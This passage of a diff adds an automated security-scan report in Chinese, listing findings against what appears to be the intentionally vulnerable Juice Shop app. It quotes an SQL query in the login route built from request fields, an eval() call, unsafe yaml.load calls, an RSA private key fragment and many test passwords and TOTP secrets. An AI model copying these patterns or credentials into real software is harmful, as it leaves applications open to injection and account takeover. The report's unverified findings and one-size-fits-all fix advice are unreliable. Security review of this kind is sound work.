+    frontend/src/app/Services/two-factor-auth-service.spec.ts:68　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>expect(req.request.body).toEqual({ password: &#39;s3cr3t!&#39;, initialToken: &#39;initialToken&#39;, setupToken: &#39;setupToken&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.45 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/two-factor-auth-service.spec.ts:84　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>expect(req.request.body).toEqual({ password: &#39;s3cr3t!&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.46 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:95　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>twoFactorAuthService.status.mockReturnValue(of({ setup: false, email: &#39;email&#39;, secret: &#39;secret&#39;, setupToken: &#39;12345&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.47 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:106　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>twoFactorAuthService.status.mockReturnValue(of({ setup: true, email: &#39;email&#39;, secret: &#39;secret&#39;, setupToken: &#39;12345&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.48 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:145　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>twoFactorAuthService.status.mockReturnValue(of({ setup: true, email: &#39;email&#39;, secret: &#39;secret&#39;, setupToken: &#39;12345&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.49 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts:243　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>twoFactorAuthService.status.mockReturnValue(of({ setup: false, email: &#39;e&#39;, secret: &#39;super-secret&#39;, setupToken: &#39;t&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.50 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    lib/insecurity.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const privateKey = &#39;-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.51 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    lib/scripts/lintConfig.ts:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>configuration = yaml.load(await readFile(file, &#39;utf8&#39;))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.52 Command Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/captcha.ts:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const answer = eval(expression).toString() // eslint-disable-line no-eval</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.53 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/fileUpload.ts:109　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const yamlString = vm.runInContext(&#39;JSON.stringify(yaml.load(data))&#39;, sandbox, { timeout: 2000 })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.54 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/login.ts:34　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: UserModel, plain: true }</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.55 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/login.ts:34　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: UserModel, plain: true }</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.56 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/vulnCodeFixes.ts:81　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const codingChallengeInfos = yaml.load(fs.readFileSync(&#39;./data/static/codefixes/&#39; + key + &#39;.info.yml&#39;, &#39;utf8&#39;))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.57 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    routes/vulnCodeSnippet.ts:90　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const codingChallengeInfos = yaml.load(await fs.readFile(&#39;./data/static/codefixes/&#39; + key + &#39;.info.yml&#39;, { encoding: &#39;utf8&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.58 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    rsn/rsnUtil.ts:135　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return yaml.load(content) as ChallengeInfo</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.59 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:42　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpToken = generateSync({ secret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.60 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:66　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpToken = generateSync({ secret: &#39;BI6KJAURX3LL5VQI2ZBFVLUWSBYBDX4H&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.61 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:85　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpToken = generateSync({ secret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.62 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:104　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpToken = generateSync({ secret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.63 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:123　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpToken = generateSync({ secret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.64 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:141　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;EinBelegtesBrotMitSchinkenSCHINKEN!&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.65 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:142　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>totpSecret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.66 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:156　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;0Y8rMnww$*9VFYE§59-!Fg1L6t&amp;6lB&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.67 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:181　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.68 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:182　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.69 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:213　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.70 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:214　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.71 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:239　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.72 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:240　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.73 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:257　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>initialToken: generateSync({ secret: &#39;OJQOJNTB46VLWUO4TVKXIULU2WLPFQOJ&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.74 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:265　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.75 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:266　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.76 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:291　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;EinBelegtesBrotMitSchinkenSCHINKEN!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.77 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:292　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpSecret = &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.78 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:316　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.79 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:317　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.80 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:351　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.81 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:352　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpSecret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.82 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:378　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.83 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:379　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const totpSecret = &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.84 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:405　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const password = &#39;123456&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.85 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/2fa.test.ts:412　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>totpSecret: &#39;KDR5FXSOLNV6A5UAQYCKROSJZF7SVML7&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.86 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/address.test.ts:24　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.87 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/authenticated-users.test.ts:37　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.88 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/basket-item.test.ts:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.89 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/basket.test.ts:32　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.90 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/basket.test.ts:114　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.91 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/basket.test.ts:170　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.92 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/chat.test.ts:261　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.93 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/chat.test.ts:330　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;jim@juice-sh.op&#39;, password: &#39;ncc-1701&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.94 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/checkKeys.test.ts:35　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ privateKey: &#39;lalalala&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.95 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/checkKeys.test.ts:46　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ privateKey: &#39;0x02c7a2a93289c9fbda5990bac6596993e9bb0a8d3f178175a80b7cfd983983f506&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.96 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/checkKeys.test.ts:57　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ privateKey: &#39;0x8343d2eb2B13A2495De435a1b15e85b98115Ce05&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.97 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/checkKeys.test.ts:68　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ privateKey: &#39;0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.98 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:53　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.99 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:73　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.100 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:90　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.101 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:110　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.102 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:321　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: adminEmail, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.103 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:343　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: adminEmail, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.104 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/data-export.test.ts:358　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: adminEmail, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.105 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/delivery.test.ts:28　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.106 Hardcoded Secret <span class="badge high">HIGH</span></h3>
